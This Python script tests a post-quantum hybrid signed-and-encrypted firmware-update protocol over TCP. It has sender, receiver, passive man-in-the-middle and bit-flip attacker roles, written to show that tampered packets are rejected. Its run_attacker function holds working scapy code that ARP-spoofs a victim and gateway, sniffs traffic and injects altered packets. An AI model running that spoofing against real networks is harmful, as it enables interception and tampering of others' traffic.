"""
TCP network validation for hybrid SIGN -> ENCRYPT firmware protocol.

Scenarios:
  A) local  -- localhost sender -> MITM proxy -> receiver
  B) lan    -- configurable LAN endpoints (Wireshark-friendly)
  C) attack -- ARP spoof + bit-flip via scapy (requires admin + --iface)
"""

from __future__ import annotations

import argparse
import hashlib
import logging
import os
import socket
import struct
import sys
import threading
import time
from pathlib import Path
from typing import Any

from cryptography.hazmat.primitives.asymmetric import x25519

from protocol import (
    CIPHER_CHACHA,
    ML_DSA_ALG,
    ML_KEM_ALG,
    KeyMaterial,
    SecurePacket,
    _unpack_signed_payload,
    decrypt_payload,
    deserialize_packet,
    encrypt_payload,
    hash_firmware,
    hybrid_kem_decapsulate,
    hybrid_kem_encapsulate,
    keygen,
    pack_signed_payload,
    protect_firmware,
    select_cipher,
    serialize_packet,
    sign,
    unprotect_firmware,
    verify,
)

logger = logging.getLogger(__name__)

ROOT = Path(__file__).resolve().parent
FIRMWARE_PATH = ROOT / "firmware_samples" / "firmware_1kb.bin"
DEFAULT_KEYS_FILE = ROOT / ".validation_keys.msgpack"
FRAME_HDR = struct.Struct("!I")

# ---------------------------------------------------------------------------
# ANSI colors
# ---------------------------------------------------------------------------

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"


def _hr(char: str = "-", width: int = 70) -> str:
    return char * width


def _box(title: str, content: str, color: str = CYAN) -> None:
    w = 68
    print(f"\n{color}{BOLD}+{'-' * w}+{RESET}")
    print(f"{color}{BOLD}| {title:<{w-2}} |{RESET}")
    print(f"{color}{BOLD}+{'-' * w}+{RESET}")
    for line in content.split("\n"):
        truncated = line[:w - 2]
        print(f"{color}|{RESET} {truncated:<{w-2}} {color}|{RESET}")
    print(f"{color}{BOLD}+{'-' * w}+{RESET}")


def _step(number: int, title: str) -> None:
    print(f"\n{YELLOW}{BOLD}{'=' * 70}{RESET}")
    print(f"{YELLOW}{BOLD}  STEP {number}: {title}{RESET}")
    print(f"{YELLOW}{BOLD}{'=' * 70}{RESET}")


def _hex_preview(data: bytes, label: str, color: str = DIM, max_bytes: int = 48) -> None:
    hex_str = data[:max_bytes].hex()
    formatted = " ".join(hex_str[i:i+2] for i in range(0, len(hex_str), 2))
    suffix = "..." if len(data) > max_bytes else ""
    print(f"  {BOLD}{label}{RESET} ({len(data)} B):")
    print(f"  {color}{formatted}{suffix}{RESET}")


def _ok(msg: str) -> None:
    print(f"  {GREEN}{BOLD}[OK] {msg}{RESET}")


def _alert(msg: str) -> None:
    print(f"  {RED}{BOLD}[ALERT] {msg}{RESET}")


def _info(msg: str) -> None:
    print(f"  {CYAN}* {msg}{RESET}")


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------


def _recv_exact(conn: socket.socket, nbytes: int) -> bytes:
    chunks: list[bytes] = []
    remaining = nbytes
    while remaining > 0:
        chunk = conn.recv(remaining)
        if not chunk:
            raise ConnectionError("Connection closed unexpectedly")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def send_framed(conn: socket.socket, payload: bytes) -> None:
    conn.sendall(FRAME_HDR.pack(len(payload)) + payload)


def recv_framed(conn: socket.socket) -> bytes:
    hdr = _recv_exact(conn, FRAME_HDR.size)
    (length,) = FRAME_HDR.unpack(hdr)
    if length <= 0 or length > 64 * 1024 * 1024:
        raise ValueError(f"Invalid frame length: {length}")
    return _recv_exact(conn, length)


# ---------------------------------------------------------------------------
# SENDER (Terminal 1) — Manufacturer
# ---------------------------------------------------------------------------


def run_sender(
    target_host: str,
    target_port: int,
    manufacturer: KeyMaterial,
    device_pub_x: bytes,
    device_pub_kem: bytes,
    trusted_pk_c: bytes,
    trusted_pk_q: bytes,
    firmware_path: str = "",
) -> None:
    """Manufacturer: interactive sign, encapsulate, encrypt, transmit."""
    os.system("")
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[attr-defined]

    print(f"\n{MAGENTA}{BOLD}{'=' * 70}{RESET}")
    print(f"{MAGENTA}{BOLD}  NODE A: MANUFACTURER (Sender){RESET}")
    print(f"{MAGENTA}{BOLD}{'=' * 70}{RESET}")

    # --- Step 1: Firmware input ---
    _step(1, "FIRMWARE INPUT")

    if firmware_path:
        fpath = Path(firmware_path)
        if not fpath.is_absolute():
            fpath = ROOT / firmware_path
        if not fpath.exists():
            print(f"  {RED}ERROR: file not found: {fpath}{RESET}", file=sys.stderr)
            sys.exit(1)
        firmware = fpath.read_bytes()
        _info(f"Loaded firmware file: {fpath.name}")
        _info(f"Size: {len(firmware)} bytes")
    else:
        print(f"\n  {WHITE}Type the firmware content (message) to send:{RESET}")
        print(f"  {DIM}(Press Enter for random 1KB binary){RESET}\n")
        try:
            user_input = input(f"  {BOLD}> {RESET}")
        except EOFError:
            user_input = ""

        if user_input.strip():
            firmware = user_input.encode("utf-8")
            _info(f"Using your message as firmware ({len(firmware)} bytes)")
        else:
            firmware = os.urandom(1024)
            _info(f"Generated random firmware ({len(firmware)} bytes)")

    _hex_preview(firmware[:48], "Firmware bytes", BLUE)

    # --- Step 2: Hashing ---
    _step(2, "HASHING (SHA3-256)")
    digest = hash_firmware(firmware)
    _info(f"Input: {len(firmware)} bytes")
    _hex_preview(digest, "SHA3-256 digest", GREEN)

    # --- Step 3: Signing ---
    _step(3, "HYBRID SIGNING (Ed25519 + ML-DSA-65)")
    print(f"  {WHITE}Signing digest with BOTH algorithms...{RESET}")
    print(f"  {WHITE}Security model: VALID = Ed25519_OK AND ML-DSA-65_OK{RESET}\n")

    t0 = time.perf_counter_ns()
    bundle = sign(firmware, manufacturer["sk_c"], manufacturer["sk_q"], manufacturer["pk_q"])
    sign_ms = (time.perf_counter_ns() - t0) / 1e6

    _hex_preview(bundle["sig_c"], "Ed25519 signature", BLUE)
    print()
    _hex_preview(bundle["sig_q"][:64], "ML-DSA-65 signature (first 64B)", MAGENTA)
    print()
    _info(f"Ed25519 sig: {len(bundle['sig_c'])} bytes")
    _info(f"ML-DSA-65 sig: {len(bundle['sig_q'])} bytes")
    _info(f"Signing time: {sign_ms:.3f} ms")
    _ok("Both signatures created")

    # --- Step 4: KEM ---
    _step(4, "HYBRID KEM ENCAPSULATION (X25519 + ML-KEM-768)")
    print(f"  {WHITE}Establishing shared secret with IoT device...{RESET}\n")

    t0 = time.perf_counter_ns()
    x_pub, mlkem_ct, sym_key = hybrid_kem_encapsulate(device_pub_x, device_pub_kem)
    kem_ms = (time.perf_counter_ns() - t0) / 1e6

    _hex_preview(x_pub, "Ephemeral X25519 pubkey", CYAN)
    print()
    _hex_preview(mlkem_ct[:48], "ML-KEM-768 ciphertext", MAGENTA)
    print()
    _hex_preview(sym_key, "Derived symmetric key (HKDF)", GREEN)
    print()
    _info(f"KEM encapsulation time: {kem_ms:.3f} ms")
    _ok("Shared secret established")

    # --- Step 5: Encryption ---
    _step(5, "ADAPTIVE ENCRYPTION")
    plaintext = pack_signed_payload(bundle)
    cipher_id = select_cipher(len(plaintext))
    _info(f"Payload: {len(plaintext)} bytes (firmware + sigs + keys)")
    _info(f"Cipher selected: {cipher_id}")
    if cipher_id == CIPHER_CHACHA:
        _info(f"Reason: payload < 100 KB -> ChaCha20-Poly1305")
    else:
        _info(f"Reason: payload >= 100 KB -> AES-256-GCM")

    aad = hashlib.sha3_256(x_pub + mlkem_ct + cipher_id.encode("ascii")).digest()
    t0 = time.perf_counter_ns()
    nonce, ciphertext, tag = encrypt_payload(plaintext, sym_key, cipher_id, aad=aad)
    enc_ms = (time.perf_counter_ns() - t0) / 1e6

    print()
    _hex_preview(nonce, "Nonce", YELLOW)
    print()
    _hex_preview(ciphertext[:48], "Ciphertext (encrypted payload)", RED)
    print()
    _hex_preview(tag, "Auth tag", RED)
    print()
    _info(f"Ciphertext: {len(ciphertext)} bytes | Tag: {len(tag)} bytes")
    _info(f"Encryption time: {enc_ms:.3f} ms")
    _ok(f"Encrypted with {cipher_id}")

    # --- Step 6: Transmit ---
    _step(6, "PACKET SERIALIZATION & TRANSMISSION")
    packet = protect_firmware(
        firmware,
        manufacturer,
        device_pub_x,
        device_pub_kem,
        metadata={"node": "manufacturer", "fw_size": len(firmware)},
    )
    wire = serialize_packet(packet)

    _box("WIRE PACKET", "\n".join([
        f"Protocol version:    1",
        f"Cipher:              {packet['cipher_identifier']}",
        f"Ciphertext:          {len(packet['ciphertext'])} bytes",
        f"Auth tag:            {len(packet['auth_tag'])} bytes",
        f"Ed25519 signature:   {len(packet['ed25519_signature'])} bytes",
        f"ML-DSA-65 signature: {len(packet['mldsa_signature'])} bytes",
        f"X25519 ephemeral:    {len(packet['x25519_public_key'])} bytes",
        f"ML-KEM ciphertext:   {len(packet['mlkem_ciphertext'])} bytes",
        f"",
        f"Total wire size:     {len(wire)} bytes",
    ]), CYAN)

    print(f"\n  {WHITE}Connecting to {target_host}:{target_port}...{RESET}")
    with socket.create_connection((target_host, target_port), timeout=30.0) as conn:
        send_framed(conn, wire)
    _ok(f"Transmitted {len(wire)} bytes to {target_host}:{target_port}")

    print(f"\n{GREEN}{BOLD}  === SENDER COMPLETE ==={RESET}\n")


# ---------------------------------------------------------------------------
# MITM PROXY (Terminal 2) — Attacker / observer
# ---------------------------------------------------------------------------


def run_mitm(
    listen_host: str,
    listen_port: int,
    forward_host: str,
    forward_port: int,
) -> None:
    """Transparent MITM proxy: intercept, display, forward."""
    os.system("")
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[attr-defined]

    print(f"\n{RED}{BOLD}{'=' * 70}{RESET}")
    print(f"{RED}{BOLD}  NODE C: MITM PROXY (Attacker / Observer){RESET}")
    print(f"{RED}{BOLD}{'=' * 70}{RESET}")
    print(f"  {DIM}Listening: {listen_host}:{listen_port}{RESET}")
    print(f"  {DIM}Forward:   {forward_host}:{forward_port}{RESET}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((listen_host, listen_port))
        srv.listen(1)
        print(f"\n  {YELLOW}Waiting for incoming packet...{RESET}")
        client, addr = srv.accept()
        with client:
            _step(1, "PACKET INTERCEPTED")
            _info(f"Source: {addr[0]}:{addr[1]}")

            wire = recv_framed(client)
            _info(f"Captured: {len(wire)} bytes")

            packet = deserialize_packet(wire)

            _step(2, "ATTACKER'S VIEW (NO DECRYPTION POSSIBLE)")
            _box("INTERCEPTED DATA", "\n".join([
                f"Protocol version: {packet['protocol_version']}",
                f"Cipher used:      {packet['cipher_identifier']}",
                f"",
                f"Can the attacker read the firmware? NO",
                f"Can the attacker forge signatures?  NO",
                f"Can the attacker derive the key?    NO",
            ]), RED)

            print()
            _hex_preview(packet["ciphertext"][:48], "Ciphertext (opaque)", RED)
            print()
            _hex_preview(packet["mlkem_ciphertext"][:48], "ML-KEM ciphertext (opaque)", RED)
            print()
            _hex_preview(packet["nonce"], "Nonce", YELLOW)
            print()
            _hex_preview(packet["auth_tag"], "Auth tag", YELLOW)
            print()
            _hex_preview(packet["x25519_public_key"], "X25519 ephemeral pubkey", DIM)
            print()
            _hex_preview(packet["ed25519_signature"], "Ed25519 signature", DIM)
            print()
            _hex_preview(packet["mldsa_signature"][:48], "ML-DSA-65 signature (first 48B)", DIM)

            print(f"\n  {RED}{BOLD}The attacker sees ONLY encrypted garbage.{RESET}")
            print(f"  {RED}{BOLD}No firmware content, no keys, no useful data.{RESET}")

            _step(3, "FORWARDING TO IoT DEVICE")
            _info("Packet forwarded WITHOUT modification")
            with socket.create_connection(
                (forward_host, forward_port), timeout=30.0
            ) as upstream:
                send_framed(upstream, wire)
            _ok(f"Forwarded {len(wire)} bytes to {forward_host}:{forward_port}")

    print(f"\n{RED}{BOLD}  === MITM COMPLETE ==={RESET}\n")


# ---------------------------------------------------------------------------
# RECEIVER (Terminal 3) — IoT Device
# ---------------------------------------------------------------------------


def run_receiver(
    bind_host: str,
    bind_port: int,
    device: KeyMaterial,
    trusted_pk_c: bytes,
    trusted_pk_q: bytes,
) -> None:
    """IoT device: receive, decrypt step-by-step, verify."""
    os.system("")
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[attr-defined]

    print(f"\n{GREEN}{BOLD}{'=' * 70}{RESET}")
    print(f"{GREEN}{BOLD}  NODE B: IoT DEVICE (Receiver){RESET}")
    print(f"{GREEN}{BOLD}{'=' * 70}{RESET}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((bind_host, bind_port))
        srv.listen(1)
        print(f"  {DIM}Listening on {bind_host}:{bind_port}{RESET}")
        print(f"\n  {YELLOW}Waiting for firmware update...{RESET}")
        conn, addr = srv.accept()
        with conn:
            _step(1, "PACKET RECEIVED")
            _info(f"From: {addr[0]}:{addr[1]}")

            wire = recv_framed(conn)
            _info(f"Received: {len(wire)} bytes")

            packet = deserialize_packet(wire)
            _info(f"Protocol version: {packet['protocol_version']}")
            _info(f"Cipher: {packet['cipher_identifier']}")

            # --- KEM Decapsulation ---
            _step(2, "KEM DECAPSULATION (X25519 + ML-KEM-768)")
            print(f"  {WHITE}Recovering shared secret using device private keys...{RESET}\n")

            t0 = time.perf_counter_ns()
            sym_key = hybrid_kem_decapsulate(
                packet["x25519_public_key"],
                packet["mlkem_ciphertext"],
                device["sk_x"],
                device["sk_kem"],
            )
            decap_ms = (time.perf_counter_ns() - t0) / 1e6

            _hex_preview(sym_key, "Recovered symmetric key", GREEN)
            print()
            _info(f"Decapsulation time: {decap_ms:.3f} ms")
            _ok("Shared secret recovered via hybrid KEM")

            # --- Decryption ---
            _step(3, "AEAD DECRYPTION")
            cipher_id = packet["cipher_identifier"]
            _info(f"Cipher: {cipher_id}")
            _info(f"Ciphertext: {len(packet['ciphertext'])} bytes")

            aad = hashlib.sha3_256(
                packet["x25519_public_key"]
                + packet["mlkem_ciphertext"]
                + cipher_id.encode("ascii")
            ).digest()

            try:
                t0 = time.perf_counter_ns()
                plaintext = decrypt_payload(
                    packet["nonce"],
                    packet["ciphertext"],
                    packet["auth_tag"],
                    sym_key,
                    cipher_id,
                    aad=aad,
                )
                dec_ms = (time.perf_counter_ns() - t0) / 1e6
            except Exception as exc:
                _alert(f"Decryption FAILED: {exc}")
                _alert("Firmware REJECTED -- integrity/decryption failure")
                sys.exit(1)

            _info(f"Decrypted payload: {len(plaintext)} bytes")
            _info(f"Decryption time: {dec_ms:.3f} ms")
            _ok("AEAD decryption successful")

            # --- Unpack signed payload ---
            _step(4, "SIGNATURE EXTRACTION")
            bundle = _unpack_signed_payload(plaintext)
            _info(f"Firmware: {len(bundle['firmware'])} bytes")
            _info(f"Digest: {bundle['digest'].hex()}")
            _hex_preview(bundle["sig_c"], "Ed25519 signature", BLUE)
            print()
            _hex_preview(bundle["sig_q"][:48], "ML-DSA-65 signature (first 48B)", MAGENTA)

            # --- Digest verification ---
            _step(5, "INTEGRITY CHECK (SHA3-256)")
            recomputed = hash_firmware(bundle["firmware"])
            _info(f"Recomputed: {recomputed.hex()}")
            _info(f"In bundle:  {bundle['digest'].hex()}")
            if recomputed == bundle["digest"]:
                _ok("Digest MATCHES -- firmware not tampered")
            else:
                _alert("Digest MISMATCH -- FIRMWARE TAMPERED")
                sys.exit(1)

            # --- Signature verification ---
            _step(6, "HYBRID SIGNATURE VERIFICATION")
            print(f"  {WHITE}Verifying BOTH signatures (AND logic):{RESET}")
            print(f"  {WHITE}ACCEPT only if Ed25519 AND ML-DSA-65 are valid.{RESET}\n")

            t0 = time.perf_counter_ns()
            accepted = verify(bundle, trusted_pk_c, trusted_pk_q)
            verify_ms = (time.perf_counter_ns() - t0) / 1e6

            if accepted:
                _ok("Ed25519 signature:   VALID")
                _ok("ML-DSA-65 signature: VALID")
                _ok(f"Verification time:   {verify_ms:.3f} ms")
            else:
                _alert("Hybrid signature verification FAILED")
                _alert("Firmware REJECTED")
                sys.exit(1)

            # --- Final ---
            _step(7, "FINAL RESULT")
            fw_data = bundle["firmware"]
            print(f"\n{GREEN}{BOLD}  +{'=' * 66}+{RESET}")
            print(f"{GREEN}{BOLD}  | {'FIRMWARE ACCEPTED -- ALL CHECKS PASSED':<64} |{RESET}")
            print(f"{GREEN}{BOLD}  +{'=' * 66}+{RESET}")
            print()
            _info(f"Firmware size: {len(fw_data)} bytes")
            try:
                text = fw_data.decode("utf-8")
                _info(f"Content: \"{text}\"")
            except UnicodeDecodeError:
                _hex_preview(fw_data[:32], "Firmware (first 32B)", GREEN)

            print(f"\n{GREEN}{BOLD}  === RECEIVER COMPLETE ==={RESET}\n")


# ---------------------------------------------------------------------------
# ATTACK MITM (bit-flip)
# ---------------------------------------------------------------------------


def run_local_attack_mitm(
    listen_host: str,
    listen_port: int,
    forward_host: str,
    forward_port: int,
    flip_target: str,
) -> None:
    """Local bit-flip MITM — corrupts one bit then forwards."""
    os.system("")
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[attr-defined]

    print(f"\n{RED}{BOLD}{'=' * 70}{RESET}")
    print(f"{RED}{BOLD}  NODE C: ACTIVE ATTACKER (bit-flip MITM){RESET}")
    print(f"{RED}{BOLD}{'=' * 70}{RESET}")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((listen_host, listen_port))
        srv.listen(1)
        print(f"  {DIM}Listening: {listen_host}:{listen_port} | Target flip: {flip_target}{RESET}")
        print(f"\n  {YELLOW}Waiting for packet to corrupt...{RESET}")
        client, addr = srv.accept()
        with client:
            wire = recv_framed(client)
            packet = deserialize_packet(wire)

            _step(1, "PACKET INTERCEPTED")
            _info(f"Captured {len(wire)} bytes from {addr}")

            _step(2, f"CORRUPTING {flip_target.upper()}")
            if flip_target == "kem":
                buf = bytearray(packet["mlkem_ciphertext"])
                _info(f"Original byte[0]: 0x{buf[0]:02x}")
                buf[0] ^= 1
                _info(f"Flipped byte[0]:  0x{buf[0]:02x}")
                packet["mlkem_ciphertext"] = bytes(buf)
            else:
                buf = bytearray(packet["ciphertext"])
                _info(f"Original byte[0]: 0x{buf[0]:02x}")
                buf[0] ^= 1
                _info(f"Flipped byte[0]:  0x{buf[0]:02x}")
                packet["ciphertext"] = bytes(buf)

            _alert(f"Flipped 1 bit in {flip_target} field!")
            corrupted = serialize_packet(packet)

            _step(3, "FORWARDING CORRUPTED PACKET")
            with socket.create_connection(
                (forward_host, forward_port), timeout=30.0
            ) as upstream:
                send_framed(upstream, corrupted)
            _ok(f"Sent corrupted packet ({len(corrupted)} bytes)")
            print(f"\n  {RED}The receiver should REJECT this packet.{RESET}")

    print(f"\n{RED}{BOLD}  === ATTACKER COMPLETE ==={RESET}\n")


# ---------------------------------------------------------------------------
# Scenario C — ARP spoof attacker (scapy)
# ---------------------------------------------------------------------------


def run_attacker(
    iface: str,
    victim_ip: str,
    gateway_ip: str,
    listen_port: int,
    forward_host: str,
    forward_port: int,
    flip_target: str,
) -> None:
    """ARP spoof + intercept + bit-flip via scapy (requires admin)."""
    try:
        from scapy.all import ARP, IP, TCP, Raw, send, sniff
    except ImportError as exc:
        print("ERROR: scapy is required for attack scenario", file=sys.stderr)
        raise SystemExit(1) from exc

    print(f"ARP spoofing {victim_ip} <-> {gateway_ip} on {iface}")
    arp_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
    arp_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

    stop = threading.Event()

    def _arp_loop() -> None:
        while not stop.is_set():
            send(arp_victim, verbose=0)
            send(arp_gateway, verbose=0)
            time.sleep(2)

    arp_thread = threading.Thread(target=_arp_loop, daemon=True)
    arp_thread.start()

    mutated = threading.Event()

    def _on_packet(pkt: Any) -> None:
        if mutated.is_set():
            return
        if not pkt.haslayer(TCP) or not pkt.haslayer(Raw):
            return
        tcp = pkt[TCP]
        if tcp.dport != listen_port and tcp.sport != listen_port:
            return
        payload = bytes(pkt[Raw].load)
        if len(payload) < FRAME_HDR.size + 1:
            return
        try:
            (length,) = FRAME_HDR.unpack(payload[: FRAME_HDR.size])
            body = bytearray(payload[FRAME_HDR.size : FRAME_HDR.size + length])
            packet = deserialize_packet(bytes(body))
            if flip_target == "kem":
                target = bytearray(packet["mlkem_ciphertext"])
                if target:
                    target[0] ^= 1
                    packet["mlkem_ciphertext"] = bytes(target)
            else:
                target = bytearray(packet["ciphertext"])
                if target:
                    target[0] ^= 1
                    packet["ciphertext"] = bytes(target)
            body = serialize_packet(packet)
            new_payload = FRAME_HDR.pack(len(body)) + body
            pkt[Raw].load = new_payload
            del pkt[IP].chksum
            del pkt[TCP].chksum
            send(pkt, verbose=0)
            mutated.set()
            print(f"[ATTACK] Flipped 1 bit in {flip_target} ciphertext")
        except Exception as exc:
            logger.debug("Non-target packet ignored: %s", exc)

    print(f"Sniffing on {iface} for TCP port {listen_port} ...")
    try:
        sniff(
            iface=iface,
            filter=f"tcp port {listen_port}",
            prn=_on_packet,
            store=0,
            timeout=60,
        )
    finally:
        stop.set()
        arp_thread.join(timeout=3)

    if not mutated.is_set():
        print(
            "WARNING: No packet mutated",
            file=sys.stderr,
        )


# ---------------------------------------------------------------------------
# Key persistence
# ---------------------------------------------------------------------------


def _serialize_role(keys: KeyMaterial) -> dict[str, bytes]:
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
    from cryptography.hazmat.primitives.serialization import (
        Encoding,
        NoEncryption,
        PrivateFormat,
    )

    sk_c = keys["sk_c"]
    if not isinstance(sk_c, Ed25519PrivateKey):
        raise TypeError("sk_c must be Ed25519PrivateKey")
    return {
        "pk_c": keys["pk_c"],
        "sk_c": sk_c.private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption()),
        "pk_q": keys["pk_q"],
        "sk_q": keys["sk_q"],
        "pk_x": keys["pk_x"],
        "sk_x": keys["sk_x"].private_bytes(Encoding.Raw, PrivateFormat.Raw, NoEncryption()),
        "pk_kem": keys["pk_kem"],
        "sk_kem": keys["sk_kem"],
    }


def _deserialize_role(blob: dict[str, bytes]) -> KeyMaterial:
    from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

    return KeyMaterial(
        pk_c=blob["pk_c"],
        sk_c=Ed25519PrivateKey.from_private_bytes(blob["sk_c"]),
        pk_q=blob["pk_q"],
        sk_q=blob["sk_q"],
        pk_x=blob["pk_x"],
        sk_x=x25519.X25519PrivateKey.from_private_bytes(blob["sk_x"]),
        pk_kem=blob["pk_kem"],
        sk_kem=blob["sk_kem"],
    )


def _load_or_create_keys(keys_file: Path) -> tuple[KeyMaterial, KeyMaterial]:
    """Manufacturer + device keys; load from disk or create once."""
    import msgpack

    if keys_file.exists():
        raw = msgpack.unpackb(keys_file.read_bytes(), raw=False)
        return _deserialize_role(raw["manufacturer"]), _deserialize_role(raw["device"])

    manufacturer = keygen()
    device = keygen()
    keys_file.parent.mkdir(parents=True, exist_ok=True)
    keys_file.write_bytes(
        msgpack.packb(
            {
                "manufacturer": _serialize_role(manufacturer),
                "device": _serialize_role(device),
            },
            use_bin_type=True,
        )
    )
    return manufacturer, device


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def _parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Hybrid firmware protocol -- network validation",
    )
    parser.add_argument(
        "--scenario",
        choices=("local", "lan", "attack"),
        default="local",
        help="Validation scenario (default: local)",
    )
    parser.add_argument(
        "--mode",
        choices=("sender", "receiver", "mitm", "attack-mitm"),
        required=True,
        help="Node role",
    )
    parser.add_argument("--host", default="127.0.0.1", help="Bind/connect host")
    parser.add_argument("--port", type=int, default=5000, help="Primary port")
    parser.add_argument("--target", default="127.0.0.1", help="Forward/target host")
    parser.add_argument("--target-port", type=int, default=5001, help="Forward/target port")
    parser.add_argument(
        "--iface",
        default="",
        help="Network interface for scapy ARP attack (e.g. eth0, Wi-Fi)",
    )
    parser.add_argument(
        "--flip",
        choices=("ciphertext", "kem"),
        default="ciphertext",
        help="Field to corrupt in attack scenario",
    )
    parser.add_argument(
        "--firmware",
        default="",
        help="Path to firmware file (e.g. firmware_samples/firmware_1kb.bin). "
        "If omitted, sender prompts for keyboard input.",
    )
    parser.add_argument(
        "--keys-file",
        default="",
        help="Path to persist key material (generated if missing)",
    )
    parser.add_argument("-v", "--verbose", action="store_true")
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    args = _parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.WARNING,
        format="%(levelname)s %(message)s",
    )

    keys_path = Path(args.keys_file) if args.keys_file else DEFAULT_KEYS_FILE
    manufacturer, device = _load_or_create_keys(keys_path)

    if args.scenario == "local":
        if args.mode == "sender":
            run_sender(
                args.host,
                args.port,
                manufacturer,
                device["pk_x"],
                device["pk_kem"],
                manufacturer["pk_c"],
                manufacturer["pk_q"],
                firmware_path=args.firmware,
            )
        elif args.mode == "receiver":
            run_receiver(
                args.host,
                args.target_port,
                device,
                manufacturer["pk_c"],
                manufacturer["pk_q"],
            )
        elif args.mode == "mitm":
            run_mitm(args.host, args.port, args.target, args.target_port)
        elif args.mode == "attack-mitm":
            run_local_attack_mitm(
                args.host,
                args.port,
                args.target,
                args.target_port,
                args.flip,
            )

    elif args.scenario == "lan":
        if args.mode == "sender":
            run_sender(
                args.target,
                args.target_port,
                manufacturer,
                device["pk_x"],
                device["pk_kem"],
                manufacturer["pk_c"],
                manufacturer["pk_q"],
                firmware_path=args.firmware,
            )
        elif args.mode == "receiver":
            run_receiver(args.host, args.port, device, manufacturer["pk_c"], manufacturer["pk_q"])
        elif args.mode == "mitm":
            run_mitm(args.host, args.port, args.target, args.target_port)
        elif args.mode == "attack-mitm":
            run_local_attack_mitm(
                args.host,
                args.port,
                args.target,
                args.target_port,
                args.flip,
            )

    elif args.scenario == "attack":
        if args.mode == "attack-mitm":
            if not args.iface:
                print("ERROR: --iface required for scapy ARP attack", file=sys.stderr)
                sys.exit(1)
            run_attacker(
                args.iface,
                args.target,
                args.host,
                args.port,
                args.target,
                args.target_port,
                args.flip,
            )
        elif args.mode == "receiver":
            run_receiver(args.host, args.port, device, manufacturer["pk_c"], manufacturer["pk_q"])
        elif args.mode == "sender":
            run_sender(
                args.target,
                args.target_port,
                manufacturer,
                device["pk_x"],
                device["pk_kem"],
                manufacturer["pk_c"],
                manufacturer["pk_q"],
                firmware_path=args.firmware,
            )
        else:
            print("ERROR: attack scenario uses sender/receiver/attack-mitm modes", file=sys.stderr)
            sys.exit(1)
    else:
        print(f"ERROR: unknown scenario {args.scenario}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
